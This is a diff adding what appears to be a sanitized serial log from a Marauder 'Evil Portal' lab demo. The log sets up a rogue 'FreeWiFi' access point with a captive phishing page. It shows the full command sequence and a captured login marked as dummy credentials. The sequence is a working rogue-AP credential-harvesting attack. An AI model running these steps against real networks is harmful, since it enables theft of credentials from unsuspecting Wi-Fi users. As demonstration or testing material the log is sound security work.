@@ -1,0 +1,27 @@
+# -----------------------------------------------------------------------------
+# Sanitized Marauder Evil Portal serial transcript (LAB DEMO)
+# Location on device: SD Card/apps_data/evil_portal/logs/log_N.txt
+# All credentials below are DUMMY TEST VALUES — no real accounts involved.
+# -----------------------------------------------------------------------------
+
+#setap=FreeWiFi
+> #clearlist -a -s -c
+access_points: 0
+stations: 0
+ssids: 0
+stations: 0
+> #ssid -a -n 'FreeWiFi'
+FreeWiFi
+> #evilportal -c sethtmlstr
+Setting HTML from serial...
+html set
+> #evilportal -c start
+Starting Evil Portal. Stop with stopscan
+AP name from SSID list: FreeWiFi
+ap config set
+html previously set
+starting ap FreeWiFi
+ap ip address: 172.0.0.1
+web server up
+> u: example@gmail.com p: examplepassword
+client connected
